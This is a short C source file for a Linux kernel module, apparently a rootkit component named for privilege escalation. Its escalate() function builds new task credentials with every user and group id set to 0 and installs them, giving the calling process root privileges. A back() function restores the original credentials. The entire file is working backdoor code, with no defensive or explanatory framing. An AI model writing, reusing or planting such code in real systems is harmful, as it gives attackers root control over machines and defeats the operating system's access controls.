#include <linux/module.h>
#include <linux/kernel.h>
#include<linux/sched.h>
#include<linux/cred.h>
#include<linux/slab.h>
#include "privilege_escalation.h"

const static struct cred * stored_cred = NULL;
static struct cred * new_cred;

void escalate(void){
  if(current->cred->uid==0){
    printk(KERN_INFO "You are already root\n");
    return;
  }
  new_cred = prepare_creds();
  if (!new_cred){
    printk(KERN_INFO "Prepare new task credential failed!\n");
    return;
  }
  // change uid, gid to root id
  new_cred->uid = 0;
  new_cred->gid = 0;
  new_cred->euid = 0;
  new_cred->egid = 0;
  new_cred->fsuid = 0;
  new_cred->fsgid = 0;

  stored_cred = override_creds(new_cred);
} 

void back(void){
  if(new_cred){
    if(current->cred->uid!=current->real_cred->uid){
      revert_creds(stored_cred);
      printk(KERN_INFO "Change user back\n");
    }else{
      printk(KERN_INFO "Revert failed, because user changed!\n");
    }
    put_cred(new_cred);
    stored_cred = NULL;
    new_cred = NULL;
  }
}
